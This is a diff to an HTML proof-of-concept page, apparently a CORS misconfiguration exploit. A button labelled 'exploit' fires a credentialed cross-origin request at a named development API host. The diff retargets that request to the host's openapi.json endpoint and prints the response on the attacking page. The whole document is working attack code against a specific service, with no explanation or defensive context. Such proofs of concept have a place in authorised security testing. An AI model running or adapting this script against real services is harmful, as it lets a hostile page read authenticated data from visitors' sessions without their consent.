@@ -11,14 +11,21 @@
     <script>
         document.getElementById('exploit').onclick = function() {
             var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://vera-devel.api.verily.com/', true);
+            xhr.open('GET', 'https://vera-devel.api.verily.com/openapi.json', true);
             xhr.withCredentials = true; // Include credentials (cookies, etc.)
             xhr.onreadystatechange = function() {
                 if (xhr.readyState == 4) {
                     if (xhr.status == 200) {
-                        document.getElementById('output').innerText = xhr.responseText;
+                        // Check for content type and handle accordingly
+                        var contentType = xhr.getResponseHeader('Content-Type');
+                        if (contentType.includes('application/json')) {
+                            var jsonResponse = JSON.parse(xhr.responseText);
+                            document.getElementById('output').innerText = JSON.stringify(jsonResponse, null, 2);
+                        } else {
+                            document.getElementById('output').innerText = xhr.responseText;
+                        }
                     } else {
-                        document.getElementById('output').innerText = 'Error: ' + xhr.status;
+                        document.getElementById('output').innerText = 'Error: ' + xhr.status + ' ' + xhr.statusText;
                     }
                 }
             };
